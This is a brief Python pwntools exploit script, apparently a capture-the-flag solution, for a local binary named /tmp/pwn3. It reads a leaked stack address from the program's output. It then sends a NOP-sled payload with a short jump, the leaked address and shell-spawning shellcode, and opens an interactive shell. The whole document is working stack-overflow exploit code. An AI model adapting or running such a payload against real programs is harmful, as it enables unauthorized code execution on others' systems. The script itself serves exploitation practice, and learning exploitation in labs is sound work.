#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
e = context.binary = ELF("/tmp/pwn3", checksec=False)
p = process()

p.recvuntil(b" journey ")
s = int(p.recv(10), 16)
p.recvline()
log.info(f"Stack leak: {hex(s)}")

input()
shell_code = asm(shellcraft.sh())
jmp = b'\xeb\x04'
padding = b'\x90'*(302 - len(jmp))
payload = padding + jmp + p32(s) + shell_code
p.sendline(payload)

p.interactive()

padding = 298 
offset = 0x12a 

